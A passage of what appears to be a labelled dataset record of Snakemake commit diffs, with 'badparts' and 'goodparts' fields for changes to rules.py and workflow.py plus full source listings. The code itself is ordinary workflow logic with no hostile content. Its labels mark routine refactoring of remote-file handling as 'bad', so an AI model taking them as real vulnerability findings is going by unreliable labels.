_variables.update(self.rule.workflow.globals)\n        _variables.update(dict(input=self.input,\n                               output=self.output,\n                               params=self.params,\n                               wildcards=self._format_wildcards,\n                               threads=self.threads,\n                               resources=self.resources,\n                               log=self.log,\n                               version=self.rule.version,\n                               rule=self.rule.name, ))\n        _variables.update(variables)\n        try:\n            return format(string, **_variables)\n        except NameError as ex:\n            raise RuleException(\"NameError: \" + str(ex), rule=self.rule)\n        except IndexError as ex:\n            raise RuleException(\"IndexError: \" + str(ex), rule=self.rule)\n\n    def properties(self, omit_resources=\"_cores _nodes\".split()):\n        resources = {\n            name: res\n            for name, res in self.resources.items()\n            if name not in omit_resources\n        }\n        params = {name: value for name, value in self.params.items()}\n        properties = {\n            \"rule\": self.rule.name,\n            \"local\": self.dag.workflow.is_local(self.rule),\n            \"input\": self.input,\n            \"output\": self.output,\n            \"params\": params,\n            \"threads\": self.threads,\n            \"resources\": resources\n        }\n        return properties\n\n    def json(self):\n        return json.dumps(self.properties())\n\n    def __repr__(self):\n        return self.rule.name\n\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.rule == other.rule and (\n            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)\n\n    def __lt__(self, other):\n        return self.rule.__lt__(other.rule)\n\n    def __gt__(self, other):\n        return self.rule.__gt__(other.rule)\n\n    def __hash__(self):\n        return self._hash\n\n    @staticmethod\n    def expand_dynamic(pattern, restriction=None, omit_value=None):\n        \"\"\" Expand dynamic files. \"\"\"\n        return list(listfiles(pattern,\n                              restriction=restriction,\n                              omit_value=omit_value))\n\n\nclass Reason:\n    def __init__(self):\n        self.updated_input = set()\n        self.updated_input_run = set()\n        self.missing_output = set()\n        self.incomplete_output = set()\n        self.forced = False\n        self.noio = False\n        self.nooutput = False\n        self.derived = True\n\n    def __str__(self):\n        s = list()\n        if self.forced:\n            s.append(\"Forced execution\")\n        else:\n            if self.noio:\n                s.append(\"Rules with neither input nor \"\n                         \"output files are always executed.\")\n            elif self.nooutput:\n                s.append(\"Rules with a run or shell declaration but no output \"\n                         \"are always executed.\")\n            else:\n                if self.missing_output:\n                    s.append(\"Missing output files: {}\".format(\n                        \", \".join(self.missing_output)))\n                if self.incomplete_output:\n                    s.append(\"Incomplete output files: {}\".format(\n                        \", \".join(self.incomplete_output)))\n                updated_input = self.updated_input - self.updated_input_run\n                if updated_input:\n                    s.append(\"Updated input files: {}\".format(\n                        \", \".join(updated_input)))\n                if self.updated_input_run:\n                    s.append(\"Input files updated by another job: {}\".format(\n                        \", \".join(self.updated_input_run)))\n        s = \"; \".join(s)\n        return s\n\n    def __bool__(self):\n        return bool(self.updated_input or self.missing_output or self.forced or\n                    self.updated_input_run or self.noio or self.nooutput)\n"}, "/snakemake/remote_providers/__init__.py": {"changes": [{"diff": "-0,", "add": 0, "remove": 0, "filename": "/snakemake/remote_providers/__init__.py", "badparts": ["0,"], "goodparts": []}]}, "/snakemake/rules.py": {"changes": [{"diff": "\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     re", "add": 6, "remove": 1, "filename": "/snakemake/rules.py", "badparts": ["                        expansion[i].append(IOFile(e, rule=branch))"], "goodparts": ["                        ioFile = IOFile(e, rule=branch)", "                        ioFile.clone_flags(f)", "                        expansion[i].append(ioFile)"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import sys import inspect import sre_constants from collections import defaultdict from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log from snakemake.io import apply_wildcards, is_flagged, not_iterable from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException class Rule: def __init__(self, *args, lineno=None, snakefile=None): \"\"\" Create a rule Arguments name --the name of the rule \"\"\" if len(args)==2: name, workflow=args self.name=name self.workflow=workflow self.docstring=None self.message=None self._input=InputFiles() self._output=OutputFiles() self._params=Params() self.dependencies=dict() self.dynamic_output=set() self.dynamic_input=set() self.temp_output=set() self.protected_output=set() self.touch_output=set() self.subworkflow_input=dict() self.resources=dict(_cores=1, _nodes=1) self.priority=0 self.version=None self._log=Log() self._benchmark=None self.wildcard_names=set() self.lineno=lineno self.snakefile=snakefile self.run_func=None self.shellcmd=None self.norun=False elif len(args)==1: other=args[0] self.name=other.name self.workflow=other.workflow self.docstring=other.docstring self.message=other.message self._input=InputFiles(other._input) self._output=OutputFiles(other._output) self._params=Params(other._params) self.dependencies=dict(other.dependencies) self.dynamic_output=set(other.dynamic_output) self.dynamic_input=set(other.dynamic_input) self.temp_output=set(other.temp_output) self.protected_output=set(other.protected_output) self.touch_output=set(other.touch_output) self.subworkflow_input=dict(other.subworkflow_input) self.resources=other.resources self.priority=other.priority self.version=other.version self._log=other._log self._benchmark=other._benchmark self.wildcard_names=set(other.wildcard_names) self.lineno=other.lineno self.snakefile=other.snakefile self.run_func=other.run_func self.shellcmd=other.shellcmd self.norun=other.norun def dynamic_branch(self, wildcards, input=True): def get_io(rule): return(rule.input, rule.dynamic_input) if input else( rule.output, rule.dynamic_output ) io, dynamic_io=get_io(self) branch=Rule(self) io_, dynamic_io_=get_io(branch) expansion=defaultdict(list) for i, f in enumerate(io): if f in dynamic_io: try: for e in reversed(expand(f, zip, **wildcards)): expansion[i].append(IOFile(e, rule=branch)) except KeyError: return None replacements=[(i, io[i], e) for i, e in reversed(list(expansion.items()))] for i, old, exp in replacements: dynamic_io_.remove(old) io_.insert_items(i, exp) if not input: for i, old, exp in replacements: if old in branch.temp_output: branch.temp_output.discard(old) branch.temp_output.update(exp) if old in branch.protected_output: branch.protected_output.discard(old) branch.protected_output.update(exp) if old in branch.touch_output: branch.touch_output.discard(old) branch.touch_output.update(exp) branch.wildcard_names.clear() non_dynamic_wildcards=dict((name, values[0]) for name, values in wildcards.items() if len(set(values))==1) (branch._input, branch._output, branch._params, branch._log, branch._benchmark, _, branch.dependencies )=branch.expand_wildcards(wildcards=non_dynamic_wildcards) return branch, non_dynamic_wildcards return branch def has_wildcards(self): \"\"\" Return True if rule contains wildcards. \"\"\" return bool(self.wildcard_names) @property def benchmark(self): return self._benchmark @benchmark.setter def benchmark(self, benchmark): self._benchmark=IOFile(benchmark, rule=self) @property def input(self): return self._input def set_input(self, *input, **kwinput): \"\"\" Add a list of input files. Recursive lists are flattened. Arguments input --the list of input files \"\"\" for item in input: self._set_inoutput_item(item) for name, item in kwinput.items(): self._set_inoutput_item(item, name=name) @property def output(self): return self._output @property def products(self): products=list(self.output) if self.benchmark: products.append(self.benchmark) return products def set_output(self, *output, **kwoutput): \"\"\" Add a list of output files. Recursive lists are flattened. Arguments output --the list of output files \"\"\" for item in output: self._set_inoutput_item(item, output=True) for name, item in kwoutput.items(): self._set_inoutput_item(item, output=True, name=name) for item in self.output: if self.dynamic_output and item not in self.dynamic_output: raise SyntaxError( \"A rule with dynamic output may not define any \" \"non-dynamic output files.\") wildcards=item.get_wildcard_names() if self.wildcard_names: if self.wildcard_names !=wildcards: raise SyntaxError( \"Not all output files of rule{} \" \"contain the same wildcards.\".format(self.name)) else: self.wildcard_names=wildcards def _set_inoutput_item(self, item, output=False, name=None): \"\"\" Set an item to be input or output. Arguments item --the item inoutput --either a Namedlist of input or output items name --an optional name for the item \"\"\" inoutput=self.output if output else self.input if isinstance(item, str): if isinstance(item, _IOFile): self.dependencies[item]=item.rule _item=IOFile(item, rule=self) if is_flagged(item, \"temp\"): if not output: raise SyntaxError(\"Only output files may be temporary\") self.temp_output.add(_item) if is_flagged(item, \"protected\"): if not output: raise SyntaxError(\"Only output files may be protected\") self.protected_output.add(_item) if is_flagged(item, \"touch\"): if not output: raise SyntaxError( \"Only output files may be marked for touching.\") self.touch_output.add(_item) if is_flagged(item, \"dynamic\"): if output: self.dynamic_output.add(_item) else: self.dynamic_input.add(_item) if is_flagged(item, \"subworkflow\"): if output: raise SyntaxError( \"Only input files may refer to a subworkflow\") else: self.subworkflow_input[_item]=item.flags[\"subworkflow\"] inoutput.append(_item) if name: inoutput.add_name(name) elif callable(item): if output: raise SyntaxError( \"Only input files can be specified as functions\") inoutput.append(item) if name: inoutput.add_name(name) else: try: start=len(inoutput) for i in item: self._set_inoutput_item(i, output=output) if name: inoutput.set_name(name, start, end=len(inoutput)) except TypeError: raise SyntaxError( \"Input and output files have to be specified as strings or lists of strings.\") @property def params(self): return self._params def set_params(self, *params, **kwparams): for item in params: self._set_params_item(item) for name, item in kwparams.items(): self._set_params_item(item, name=name) def _set_params_item(self, item, name=None): if isinstance(item, str) or callable(item): self.params.append(item) if name: self.params.add_name(name) else: try: start=len(self.params) for i in item: self._set_params_item(i) if name: self.params.set_name(name, start, end=len(self.params)) except TypeError: raise SyntaxError(\"Params have to be specified as strings.\") @property def log(self): return self._log def set_log(self, *logs, **kwlogs): for item in logs: self._set_log_item(item) for name, item in kwlogs.items(): self._set_log_item(item, name=name) def _set_log_item(self, item, name=None): if isinstance(item, str) or callable(item): self.log.append(IOFile(item, rule=self) if isinstance(item, str) else item) if name: self.log.add_name(name) else: try: start=len(self.log) for i in item: self._set_log_item(i) if name: self.log.set_name(name, start, end=len(self.log)) except TypeError: raise SyntaxError(\"Log files have to be specified as strings.\") def expand_wildcards(self, wildcards=None): \"\"\" Expand wildcards depending on the requested output or given wildcards dict. \"\"\" def concretize_iofile(f, wildcards): if not isinstance(f, _IOFile): return IOFile(f, rule=self) else: return f.apply_wildcards(wildcards, fill_missing=f in self.dynamic_input, fail_dynamic=self.dynamic_output) def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj, concretize=apply_wildcards, ruleio=None): for name, item in olditems.allitems(): start=len(newitems) is_iterable=True if callable(item): try: item=item(wildcards_obj) except(Exception, BaseException) as e: raise InputFunctionException(e, rule=self) if not_iterable(item): item=[item] is_iterable=False for item_ in item: if not isinstance(item_, str): raise RuleException( \"Input function did not return str or list of str.\", rule=self) concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ else: if not_iterable(item): item=[item] is_iterable=False for item_ in item: concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ if name: newitems.set_name( name, start, end=len(newitems) if is_iterable else None) if wildcards is None: wildcards=dict() missing_wildcards=self.wildcard_names -set(wildcards.keys()) if missing_wildcards: raise RuleException( \"Could not resolve wildcards in rule{}:\\n{}\".format( self.name, \"\\n\".join(self.wildcard_names)), lineno=self.lineno, snakefile=self.snakefile) ruleio=dict() try: input=InputFiles() wildcards_obj=Wildcards(fromdict=wildcards) _apply_wildcards(input, self.input, wildcards, wildcards_obj, concretize=concretize_iofile, ruleio=ruleio) params=Params() _apply_wildcards(params, self.params, wildcards, wildcards_obj) output=OutputFiles(o.apply_wildcards(wildcards) for o in self.output) output.take_names(self.output.get_names()) dependencies={ None if f is None else f.apply_wildcards(wildcards): rule for f, rule in self.dependencies.items() } ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output))) log=Log() _apply_wildcards(log, self.log, wildcards, wildcards_obj, concretize=concretize_iofile) benchmark=self.benchmark.apply_wildcards( wildcards) if self.benchmark else None return input, output, params, log, benchmark, ruleio, dependencies except WildcardError as ex: raise RuleException( \"Wildcards in input, params, log or benchmark file of rule{} cannot be \" \"determined from output files:\\n{}\".format(self, str(ex)), lineno=self.lineno, snakefile=self.snakefile) def is_producer(self, requested_output): \"\"\" Returns True if this rule is a producer of the requested output. \"\"\" try: for o in self.products: if o.match(requested_output): return True return False except sre_constants.error as ex: raise IOFileException(\"{} in wildcard statement\".format(ex), snakefile=self.snakefile, lineno=self.lineno) except ValueError as ex: raise IOFileException(\"{}\".format(ex), snakefile=self.snakefile, lineno=self.lineno) def get_wildcards(self, requested_output): \"\"\" Update the given wildcard dictionary by matching regular expression output files to the requested concrete ones. Arguments wildcards --a dictionary of wildcards requested_output --a concrete filepath \"\"\" if requested_output is None: return dict() bestmatchlen=0 bestmatch=None for o in self.products: match=o.match(requested_output) if match: l=self.get_wildcard_len(match.groupdict()) if not bestmatch or bestmatchlen > l: bestmatch=match.groupdict() bestmatchlen=l return bestmatch @staticmethod def get_wildcard_len(wildcards): \"\"\" Return the length of the given wildcard values. Arguments wildcards --a dict of wildcards \"\"\" return sum(map(len, wildcards.values())) def __lt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp < 0 def __gt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp > 0 def __str__(self): return self.name def __hash__(self): return self.name.__hash__() def __eq__(self, other): return self.name==other.name class Ruleorder: def __init__(self): self.order=list() def add(self, *rulenames): \"\"\" Records the order of given rules as rule1 > rule2 > rule3,... \"\"\" self.order.append(list(rulenames)) def compare(self, rule1, rule2): \"\"\" Return whether rule2 has a higher priority than rule1. \"\"\" for clause in reversed(self.order): try: i=clause.index(rule1.name) j=clause.index(rule2.name) comp=j -i if comp < 0: comp=-1 elif comp > 0: comp=1 return comp except ValueError: pass wildcard_cmp=rule2.has_wildcards() -rule1.has_wildcards() if wildcard_cmp !=0: return wildcard_cmp return 0 def __iter__(self): return self.order.__iter__() ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport sys\nimport inspect\nimport sre_constants\nfrom collections import defaultdict\n\nfrom snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist\nfrom snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log\nfrom snakemake.io import apply_wildcards, is_flagged, not_iterable\nfrom snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException\n\n\nclass Rule:\n    def __init__(self, *args, lineno=None, snakefile=None):\n        \"\"\"\n        Create a rule\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if len(args) == 2:\n            name, workflow = args\n            self.name = name\n            self.workflow = workflow\n            self.docstring = None\n            self.message = None\n            self._input = InputFiles()\n            self._output = OutputFiles()\n            self._params = Params()\n            self.dependencies = dict()\n            self.dynamic_output = set()\n            self.dynamic_input = set()\n            self.temp_output = set()\n            self.protected_output = set()\n            self.touch_output = set()\n            self.subworkflow_input = dict()\n            self.resources = dict(_cores=1, _nodes=1)\n            self.priority = 0\n            self.version = None\n            self._log = Log()\n            self._benchmark = None\n            self.wildcard_names = set()\n            self.lineno = lineno\n            self.snakefile = snakefile\n            self.run_func = None\n            self.shellcmd = None\n            self.norun = False\n        elif len(args) == 1:\n            other = args[0]\n            self.name = other.name\n            self.workflow = other.workflow\n            self.docstring = other.docstring\n            self.message = other.message\n            self._input = InputFiles(other._input)\n            self._output = OutputFiles(other._output)\n            self._params = Params(other._params)\n            self.dependencies = dict(other.dependencies)\n            self.dynamic_output = set(other.dynamic_output)\n            self.dynamic_input = set(other.dynamic_input)\n            self.temp_output = set(other.temp_output)\n            self.protected_output = set(other.protected_output)\n            self.touch_output = set(other.touch_output)\n            self.subworkflow_input = dict(other.subworkflow_input)\n            self.resources = other.resources\n            self.priority = other.priority\n            self.version = other.version\n            self._log = other._log\n            self._benchmark = other._benchmark\n            self.wildcard_names = set(other.wildcard_names)\n            self.lineno = other.lineno\n            self.snakefile = other.snakefile\n            self.run_func = other.run_func\n            self.shellcmd = other.shellcmd\n            self.norun = other.norun\n\n    def dynamic_branch(self, wildcards, input=True):\n        def get_io(rule):\n            return (rule.input, rule.dynamic_input) if input else (\n                rule.output, rule.dynamic_output\n            )\n\n        io, dynamic_io = get_io(self)\n\n        branch = Rule(self)\n        io_, dynamic_io_ = get_io(branch)\n\n        expansion = defaultdict(list)\n        for i, f in enumerate(io):\n            if f in dynamic_io:\n                try:\n                    for e in reversed(expand(f, zip, **wildcards)):\n                        expansion[i].append(IOFile(e, rule=branch))\n                except KeyError:\n                    return None\n\n        # replace the dynamic files with the expanded files\n        replacements = [(i, io[i], e)\n                        for i, e in reversed(list(expansion.items()))]\n        for i, old, exp in replacements:\n            dynamic_io_.remove(old)\n            io_.insert_items(i, exp)\n\n        if not input:\n            for i, old, exp in replacements:\n                if old in branch.temp_output:\n                    branch.temp_output.discard(old)\n                    branch.temp_output.update(exp)\n                if old in branch.protected_output:\n                    branch.protected_output.discard(old)\n                    branch.protected_output.update(exp)\n                if old in branch.touch_output:\n                    branch.touch_output.discard(old)\n                    branch.touch_output.update(exp)\n\n            branch.wildcard_names.clear()\n            non_dynamic_wildcards = dict((name, values[0])\n                                         for name, values in wildcards.items()\n                                         if len(set(values)) == 1)\n            # TODO have a look into how to concretize dependencies here\n            (branch._input, branch._output, branch._params, branch._log,\n             branch._benchmark, _, branch.dependencies\n             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)\n            return branch, non_dynamic_wildcards\n        return branch\n\n    def has_wildcards(self):\n        \"\"\"\n        Return True if rule contains wildcards.\n        \"\"\"\n        return bool(self.wildcard_names)\n\n    @property\n    def benchmark(self):\n        return self._benchmark\n\n    @benchmark.setter\n    def benchmark(self, benchmark):\n        self._benchmark = IOFile(benchmark, rule=self)\n\n    @property\n    def input(self):\n        return self._input\n\n    def set_input(self, *input, **kwinput):\n        \"\"\"\n        Add a list of input files. Recursive lists are flattened.\n\n        Arguments\n        input -- the list of input files\n        \"\"\"\n        for item in input:\n            self._set_inoutput_item(item)\n        for name, item in kwinput.items():\n            self._set_inoutput_item(item, name=name)\n\n    @property\n    def output(self):\n        return self._output\n\n    @property\n    def products(self):\n        products = list(self.output)\n        if self.benchmark:\n            products.append(self.benchmark)\n        return products\n\n    def set_output(self, *output, **kwoutput):\n        \"\"\"\n        Add a list of output files. Recursive lists are flattened.\n\n        Arguments\n        output -- the list of output files\n        \"\"\"\n        for item in output:\n            self._set_inoutput_item(item, output=True)\n        for name, item in kwoutput.items():\n            self._set_inoutput_item(item, output=True, name=name)\n\n        for item in self.output:\n            if self.dynamic_output and item not in self.dynamic_output:\n                raise SyntaxError(\n                    \"A rule with dynamic output may not define any \"\n                    \"non-dynamic output files.\")\n            wildcards = item.get_wildcard_names()\n            if self.wildcard_names:\n                if self.wildcard_names != wildcards:\n                    raise SyntaxError(\n                        \"Not all output files of rule {} \"\n                        \"contain the same wildcards.\".format(self.name))\n            else:\n                self.wildcard_names = wildcards\n\n    def _set_inoutput_item(self, item, output=False, name=None):\n        \"\"\"\n        Set an item to be input or output.\n\n        Arguments\n        item     -- the item\n        inoutput -- either a Namedlist of input or output items\n        name     -- an optional name for the item\n        \"\"\"\n        inoutput = self.output if output else self.input\n        if isinstance(item, str):\n            # add the rule to the dependencies\n            if isinstance(item, _IOFile):\n                self.dependencies[item] = item.rule\n            _item = IOFile(item, rule=self)\n            if is_flagged(item, \"temp\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be temporary\")\n                self.temp_output.add(_item)\n            if is_flagged(item, \"protected\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be protected\")\n                self.protected_output.add(_item)\n            if is_flagged(item, \"touch\"):\n                if not output:\n                    raise SyntaxError(\n                        \"Only output files may be marked for touching.\")\n                self.touch_output.add(_item)\n            if is_flagged(item, \"dynamic\"):\n                if output:\n                    self.dynamic_output.add(_item)\n                else:\n                    self.dynamic_input.add(_item)\n            if is_flagged(item, \"subworkflow\"):\n                if output:\n                    raise SyntaxError(\n                        \"Only input files may refer to a subworkflow\")\n                else:\n                    # record the workflow this item comes from\n                    self.subworkflow_input[_item] = item.flags[\"subworkflow\"]\n            inoutput.append(_item)\n            if name:\n                inoutput.add_name(name)\n        elif callable(item):\n            if output:\n                raise SyntaxError(\n                    \"Only input files can be specified as functions\")\n            inoutput.append(item)\n            if name:\n                inoutput.add_name(name)\n        else:\n            try:\n                start = len(inoutput)\n                for i in item:\n                    self._set_inoutput_item(i, output=output)\n                if name:\n                    # if the list was named, make it accessible\n                    inoutput.set_name(name, start, end=len(inoutput))\n            except TypeError:\n                raise SyntaxError(\n                    \"Input and output files have to be specified as strings or lists of strings.\")\n\n    @property\n    def params(self):\n        return self._params\n\n    def set_params(self, *params, **kwparams):\n        for item in params:\n            self._set_params_item(item)\n        for name, item in kwparams.items():\n            self._set_params_item(item, name=name)\n\n    def _set_params_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.params.append(item)\n            if name:\n                self.params.add_name(name)\n        else:\n            try:\n                start = len(self.params)\n                for i in item:\n                    self._set_params_item(i)\n                if name:\n                    self.params.set_name(name, start, end=len(self.params))\n            except TypeError:\n                raise SyntaxError(\"Params have to be specified as strings.\")\n\n    @property\n    def log(self):\n        return self._log\n\n    def set_log(self, *logs, **kwlogs):\n        for item in logs:\n            self._set_log_item(item)\n        for name, item in kwlogs.items():\n            self._set_log_item(item, name=name)\n\n    def _set_log_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.log.append(IOFile(item,\n                                   rule=self)\n                            if isinstance(item, str) else item)\n            if name:\n                self.log.add_name(name)\n        else:\n            try:\n                start = len(self.log)\n                for i in item:\n                    self._set_log_item(i)\n                if name:\n                    self.log.set_name(name, start, end=len(self.log))\n            except TypeError:\n                raise SyntaxError(\"Log files have to be specified as strings.\")\n\n    def expand_wildcards(self, wildcards=None):\n        \"\"\"\n        Expand wildcards depending on the requested output\n        or given wildcards dict.\n        \"\"\"\n\n        def concretize_iofile(f, wildcards):\n            if not isinstance(f, _IOFile):\n                return IOFile(f, rule=self)\n            else:\n                return f.apply_wildcards(wildcards,\n                                         fill_missing=f in self.dynamic_input,\n                                         fail_dynamic=self.dynamic_output)\n\n        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,\n                             concretize=apply_wildcards,\n                             ruleio=None):\n            for name, item in olditems.allitems():\n                start = len(newitems)\n                is_iterable = True\n                if callable(item):\n                    try:\n                        item = item(wildcards_obj)\n                    except (Exception, BaseException) as e:\n                        raise InputFunctionException(e, rule=self)\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        if not isinstance(item_, str):\n                            raise RuleException(\n                                \"Input function did not return str or list of str.\",\n                                rule=self)\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                else:\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                if name:\n                    newitems.set_name(\n                        name, start,\n                        end=len(newitems) if is_iterable else None)\n\n        if wildcards is None:\n            wildcards = dict()\n        missing_wildcards = self.wildcard_names - set(wildcards.keys())\n\n        if missing_wildcards:\n            raise RuleException(\n                \"Could not resolve wildcards in rule {}:\\n{}\".format(\n                    self.name, \"\\n\".join(self.wildcard_names)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n        ruleio = dict()\n\n        try:\n            input = InputFiles()\n            wildcards_obj = Wildcards(fromdict=wildcards)\n            _apply_wildcards(input, self.input, wildcards, wildcards_obj,\n                             concretize=concretize_iofile,\n                             ruleio=ruleio)\n\n            params = Params()\n            _apply_wildcards(params, self.params, wildcards, wildcards_obj)\n\n            output = OutputFiles(o.apply_wildcards(wildcards)\n                                 for o in self.output)\n            output.take_names(self.output.get_names())\n\n            dependencies = {\n                None if f is None else f.apply_wildcards(wildcards): rule\n                for f, rule in self.dependencies.items()\n            }\n\n            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))\n\n            log = Log()\n            _apply_wildcards(log, self.log, wildcards, wildcards_obj,\n                             concretize=concretize_iofile)\n\n            benchmark = self.benchmark.apply_wildcards(\n                wildcards) if self.benchmark else None\n            return input, output, params, log, benchmark, ruleio, dependencies\n        except WildcardError as ex:\n            # this can only happen if an input contains an unresolved wildcard.\n            raise RuleException(\n                \"Wildcards in input, params, log or benchmark file of rule {} cannot be \"\n                \"determined from output files:\\n{}\".format(self, str(ex)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n    def is_producer(self, requested_output):\n        \"\"\"\n        Returns True if this rule is a producer of the requested output.\n        \"\"\"\n        try:\n            for o in self.products:\n                if o.match(requested_output):\n                    return True\n            return False\n        except sre_constants.error as ex:\n            raise IOFileException(\"{} in wildcard statement\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n        except ValueError as ex:\n            raise IOFileException(\"{}\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n\n    def get_wildcards(self, requested_output):\n        \"\"\"\n        Update the given wildcard dictionary by matching regular expression\n        output files to the requested concrete ones.\n\n        Arguments\n        wildcards -- a dictionary of wildcards\n        requested_output -- a concrete filepath\n        \"\"\"\n        if requested_output is None:\n            return dict()\n        bestmatchlen = 0\n        bestmatch = None\n\n        for o in self.products:\n            match = o.match(requested_output)\n            if match:\n                l = self.get_wildcard_len(match.groupdict())\n                if not bestmatch or bestmatchlen > l:\n                    bestmatch = match.groupdict()\n                    bestmatchlen = l\n        return bestmatch\n\n    @staticmethod\n    def get_wildcard_len(wildcards):\n        \"\"\"\n        Return the length of the given wildcard values.\n\n        Arguments\n        wildcards -- a dict of wildcards\n        \"\"\"\n        return sum(map(len, wildcards.values()))\n\n    def __lt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp < 0\n\n    def __gt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp > 0\n\n    def __str__(self):\n        return self.name\n\n    def __hash__(self):\n        return self.name.__hash__()\n\n    def __eq__(self, other):\n        return self.name == other.name\n\n\nclass Ruleorder:\n    def __init__(self):\n        self.order = list()\n\n    def add(self, *rulenames):\n        \"\"\"\n        Records the order of given rules as rule1 > rule2 > rule3, ...\n        \"\"\"\n        self.order.append(list(rulenames))\n\n    def compare(self, rule1, rule2):\n        \"\"\"\n        Return whether rule2 has a higher priority than rule1.\n        \"\"\"\n        # try the last clause first,\n        # i.e. clauses added later overwrite those before.\n        for clause in reversed(self.order):\n            try:\n                i = clause.index(rule1.name)\n                j = clause.index(rule2.name)\n                # rules with higher priority should have a smaller index\n                comp = j - i\n                if comp < 0:\n                    comp = -1\n                elif comp > 0:\n                    comp = 1\n                return comp\n            except ValueError:\n                pass\n\n        # if not ruleorder given, prefer rule without wildcards\n        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()\n        if wildcard_cmp != 0:\n            return wildcard_cmp\n\n        return 0\n\n    def __iter__(self):\n        return self.order.__iter__()\n"}, "/snakemake/workflow.py": {"changes": [{"diff": "\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd", "add": 1, "remove": 1, "filename": "/snakemake/workflow.py", "badparts": ["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"], "goodparts": ["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import re import os import sys import signal import json import urllib from collections import OrderedDict from itertools import filterfalse, chain from functools import partial from operator import attrgetter from snakemake.logging import logger, format_resources, format_resource_names from snakemake.rules import Rule, Ruleorder from snakemake.exceptions import RuleException, CreateRuleException, \\ UnknownRuleException, NoRulesException, print_exception, WorkflowError from snakemake.shell import shell from snakemake.dag import DAG from snakemake.scheduler import JobScheduler from snakemake.parser import parse import snakemake.io from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch from snakemake.persistence import Persistence from snakemake.utils import update_config class Workflow: def __init__(self, snakefile=None, snakemakepath=None, jobscript=None, overwrite_shellcmd=None, overwrite_config=dict(), overwrite_workdir=None, overwrite_configfile=None, config_args=None, debug=False): \"\"\" Create the controller. \"\"\" self._rules=OrderedDict() self.first_rule=None self._workdir=None self.overwrite_workdir=overwrite_workdir self.workdir_init=os.path.abspath(os.curdir) self._ruleorder=Ruleorder() self._localrules=set() self.linemaps=dict() self.rule_count=0 self.basedir=os.path.dirname(snakefile) self.snakefile=os.path.abspath(snakefile) self.snakemakepath=snakemakepath self.included=[] self.included_stack=[] self.jobscript=jobscript self.persistence=None self.global_resources=None self.globals=globals() self._subworkflows=dict() self.overwrite_shellcmd=overwrite_shellcmd self.overwrite_config=overwrite_config self.overwrite_configfile=overwrite_configfile self.config_args=config_args self._onsuccess=lambda log: None self._onerror=lambda log: None self.debug=debug global config config=dict() config.update(self.overwrite_config) global rules rules=Rules() @property def subworkflows(self): return self._subworkflows.values() @property def rules(self): return self._rules.values() @property def concrete_files(self): return( file for rule in self.rules for file in chain(rule.input, rule.output) if not callable(file) and not file.contains_wildcard() ) def check(self): for clause in self._ruleorder: for rulename in clause: if not self.is_rule(rulename): raise UnknownRuleException( rulename, prefix=\"Error in ruleorder definition.\") def add_rule(self, name=None, lineno=None, snakefile=None): \"\"\" Add a rule. \"\"\" if name is None: name=str(len(self._rules) +1) if self.is_rule(name): raise CreateRuleException( \"The name{} is 